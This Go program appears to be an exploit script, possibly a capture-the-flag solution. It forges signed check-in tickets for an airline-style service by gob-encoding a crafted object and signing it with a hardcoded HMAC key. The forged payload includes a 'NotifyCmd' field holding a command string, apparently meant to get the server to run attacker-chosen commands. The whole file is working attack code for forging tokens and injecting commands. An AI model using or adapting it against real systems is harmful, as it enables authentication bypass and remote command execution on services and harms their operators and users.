package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/gob"
	"flag"
	"fmt"
	"net/url"
	"os"
)

const key = "JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR"

type VerifyTicketAuthenticity struct {
	Data []byte
}

func init() {
	// server registered the POINTER type -> wire name is "*gob.VerifyTicketAuthenticity"
	gob.RegisterName("*gob.VerifyTicketAuthenticity", &VerifyTicketAuthenticity{})
}

func forge(data string) string {
	var iface interface{} = &VerifyTicketAuthenticity{Data: []byte(data)}
	var buf bytes.Buffer
	if err := gob.NewEncoder(&buf).Encode(&iface); err != nil {
		panic(err)
	}
	gb := buf.Bytes()
	m := hmac.New(sha256.New, []byte(key))
	m.Write(gb)
	full := append(gb, m.Sum(nil)...)
	return url.QueryEscape(base64.StdEncoding.EncodeToString(full))
}

func main() {
	pnr := flag.String("pnr", "EYU4A7", "PNR")
	token := flag.String("token", "0c2056c41ed2462f379e4e18f5035c06", "inner Token")
	seat := flag.String("seat", "1A", "Seat")
	pax := flag.String("passenger", "Johna Stones", "Passenger")
	notify := flag.String("notify", "check-in-notify --pnr H9R5MP --email johna.stones@gmail.com", "NotifyCmd")
	rawjson := flag.String("json", "", "full raw JSON, overrides field flags")
	prefix := flag.String("url", "", "string to prepend (e.g. a check-in URL)")
	out := flag.String("out", "", "write payload to file")
	flag.Parse()

	data := *rawjson
	if data == "" {
		data = fmt.Sprintf(`{"PNR":%q,"Token":%q,"Seat":%q,"Passenger":%q,"NotifyCmd":%q}`,
			*pnr, *token, *seat, *pax, *notify)
	}
	p := *prefix + forge(data)
	fmt.Println(p)
	if *out != "" {
		os.WriteFile(*out, []byte(p), 0644)
	}
}
